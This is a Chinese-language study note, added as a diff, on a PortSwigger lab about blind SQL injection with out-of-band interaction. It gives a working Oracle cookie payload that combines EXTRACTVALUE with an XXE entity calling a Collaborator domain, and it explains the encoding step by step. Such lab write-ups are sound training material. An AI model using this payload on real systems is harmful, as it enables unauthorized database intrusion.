@@ -1,0 +1,37 @@
+靶场地址: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+
+###
+竟然让我充pro,过分呐
+pro已有
+
+=====关于本题构造=====
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
+<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//你的Collaborator域名/">+%25remote%3b]>'),'/l')
++FROM+dual--
+
+1. 先离开原本的字符串: x' --
+
+2.  使用 UNION SELECT EXTRACTVALUE(...) FROM dual
+-> EXTRACTVALUE extract_value
+
+3. xmltype(xml_char,'/l')       '/l' 是字母 l,EXTRACTVALUE 的 XPath参数
+
+4. 带外 XML:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root[
+    <!ENTITY % remote SYSTEM "http://你的burp_Collaborator域名/">
+    %remote;    // 没有这一行,就只是查询,不会发起 DNS查询
+]>
+root: 根元素的名字;随便取的,不是重点
+ENTITY: 声明一个实体,entity n.实体
+% : 表示这是一个参数实体
+remote: 实体名称;可以自定义,这里表示"远程内容"
+SYSTEM: 表示实体内容位于一个外部系统资源中
+域名 : 外部资源地址; 测试网站数据库的 XML 解析器会尝试访问它
+%remote; : 引用刚定义的实体参数;这一步才能真正使解析器访问该URL 
+
+
+5. 编码: + -> 空格      %3f -> ?     %3d -> =    %25 -> %
+        %3a -> :       %3b -> ;
+这里 空格=%: 问题都不打,唯独 %3b -> ; 非常重要
+裸露的 ; 在 cookie中,会被当作下一个 cookie的分隔符
